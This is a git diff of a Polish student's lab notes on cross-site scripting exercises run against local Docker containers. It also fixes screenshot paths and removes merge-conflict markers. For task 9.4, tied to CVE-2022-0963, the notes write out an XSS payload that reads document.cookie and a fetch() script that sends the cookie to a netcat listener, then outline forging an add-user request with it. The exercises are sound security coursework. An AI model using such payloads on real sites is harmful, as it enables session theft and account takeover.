@@ -1,5 +1,4 @@
 ## Problem z podmanem (wymiana na Dockera)
-<<<<<<< HEAD
 
 https://medium.com/@nocerainfosec/docker-on-parrot-os-security-5-3-a-fresh-and-foolproof-installation-guide-5d8e9cd9e159
 
@@ -19,7 +18,7 @@ https://medium.com/@nocerainfosec/docker-on-parrot-os-security-5-3-a-fresh-and-f
 
 ## Zadanie 9.1
 
-![Zadanie 2](/home/filip/Dokumenty/Studia/Informatyka/CybersecurityAndCryptography/screenshots/XSS/zadanie2.png)
+![](screenshots/XSS/zadanie1.png)
 
 - wchodzimy na serwer `localhost:9091/admin/index.php`
 
@@ -33,7 +32,7 @@ https://medium.com/@nocerainfosec/docker-on-parrot-os-security-5-3-a-fresh-and-f
 
 ## Zadanie 9.2
 
-![Zadanie 3](/home/filip/Dokumenty/Studia/Informatyka/CybersecurityAndCryptography/screenshots/XSS/zadanie3.png)
+![Zadanie 3](./screenshots/XSS/zadanie2.png)
 
 - wchodzimy na serwer `localhost:9092/admin/index.php`
 
@@ -43,7 +42,7 @@ https://medium.com/@nocerainfosec/docker-on-parrot-os-security-5-3-a-fresh-and-f
 
 ## Zadanie 9.3
 
-![](/home/filip/.config/marktext/images/2025-01-24-17-42-56-image.png)
+![](./screenshots/XSS/zadanie3.png)
 
 - wchodzimy na serwer `localhost:9094/admin/index.php`
 
@@ -53,7 +52,7 @@ https://medium.com/@nocerainfosec/docker-on-parrot-os-security-5-3-a-fresh-and-f
 
 ## Zadanie 9.4
 
-![](/home/filip/.config/marktext/images/2025-01-24-17-59-43-image.png)
+![](./screenshots/XSS/zadanie4.png)
 
 - `docker run -dp 9094:80 mazurkatarzyna/cwe-79-ex4:latest`
 
@@ -61,11 +60,43 @@ https://medium.com/@nocerainfosec/docker-on-parrot-os-security-5-3-a-fresh-and-f
 
 - Ustawiamy dane (np. a: a: a: a) i uruchamiamy instalację. Kontener o dziwo nie padł. 
 
-- Przygotowujemy podatny plik z kodem .js. 
-=======
-https://medium.com/@nocerainfosec/docker-on-parrot-os-security-5-3-a-fresh-and-foolproof-installation-guide-5d8e9cd9e159
+- Zapoznajemy się z opisem podatności na huntr.dev: [CVE-2022-0963]([huntr - The world’s first bug bounty platform for AI/ML](https://huntr.com/bounties/a89a4198-0880-4aa2-8439-a463f39f244c)
 
-## Podniesienie kontenera z docker-compose podanym w pliku
-`docker compose -f <nazwa_pliku_z_docker_compose>.yml up`
+- Przygotowujemy payload podobny jak do tego ze strony. Np.
+  `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.cookie)</x:script>`. Powyższe cudo wyświetli nam wszystkie pliki cookie ze strony.
 
->>>>>>> 7b65589887a844404edc0e1b1e7608e66c83335e
+- Aby wysłać coś na inny serwer, można posłużyć się [na przykład tym poradnikiem]([XMLHttpRequest: send() method - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send). Ja spróbuję
+  
+  - uruchomić netcata na porcie 1111 localhosta
+    `nc -l -p 1111` (na wszystkich interefjsach) lub `netcat -l 127.0.0.1 -p 1111` (tylko na localhost)
+  
+  - przygotować odpowiedni skrypt w javascripcie, np:
+    
+    ```
+    <x:script xmlns:x="http://www.w3.org/1999/xhtml">
+      fetch("http://127.0.0.1:1111/?cookie=" + encodeURIComponent(document.cookie))
+    </x:script>
+    
+    ```
+    
+    ![](screenshots/2025-01-25-14-13-40-image.png)
+
+- Aby dodać do aplikacji nowego usera, trzeba podglądnąć request który to robi i spreparować taki sam wstawiając w odpowiednie miejsce wartość cookie. 
+  
+  
+
+## Zadanie 9.5
+
+![](./screenshots/XSS/zadanie5.png)
+
+## Zadanie 9.6
+
+![](./screenshots/XSS/zadanie6.png)
+
+## Zadanie 9.7
+
+![](./screenshots/XSS/zadanie7.png)
+
+## Zadanie 9.8
+
+![](./screenshots/XSS/zadanie8.png)
